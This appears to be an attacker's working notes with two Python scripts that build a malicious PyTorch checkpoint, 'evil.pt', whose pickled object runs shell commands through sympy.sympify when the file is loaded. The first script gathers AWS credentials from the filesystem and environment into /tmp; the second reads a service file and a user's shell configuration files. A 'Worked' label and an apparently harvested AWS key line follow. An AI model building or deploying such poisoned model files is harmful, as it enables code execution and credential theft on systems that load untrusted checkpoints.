**Worked:** 
```
import torch
import sympy

class SympifyRCE:
    def __reduce__(self):
        cmd = "__import__('os').system('find / -name credentials -path *aws* 2>/dev/null > /tmp/creds.txt; env | grep -i aws >> /tmp/creds.txt; cat /root/.aws/credentials >> /tmp/creds.txt 2>/dev/null; ls /home/ >> /tmp/creds.txt')"
        return (sympy.sympify, (cmd,))

padding = "A" * (1024 * 1024 * 2)

payload = {
    "model_state_dict": SympifyRCE(),
    "optimizer_state_dict": {},
    "epoch": 1,
    "padding": padding,
}

torch.save(payload, "/home/jaimie/evil.pt")
```

For answer : 

```
import torch
import sympy

class SympifyRCE:
    def __reduce__(self):
        cmd = "__import__('os').system('cat /etc/systemd/system/eval-portal.service > /tmp/creds2.txt 2>&1; cat /home/saidi/.bashrc >> /tmp/creds2.txt 2>&1; cat /home/saidi/.profile >> /tmp/creds2.txt 2>&1; ls -la /home/saidi/ >> /tmp/creds2.txt 2>&1')"
        return (sympy.sympify, (cmd,))

padding = "A" * (1024 * 1024 * 2)

payload = {
    "model_state_dict": {"weight": torch.zeros(1)},
    "optimizer_state_dict": {},
    "epoch": 1,
    "padding": padding,
    "extra": SympifyRCE(),
}

torch.save(payload, "/home/jaimie/evil.pt")

```

```
AWS_ACCESS_KEY_ID=AKIAFAKEBIOGENAI_SAIDI

```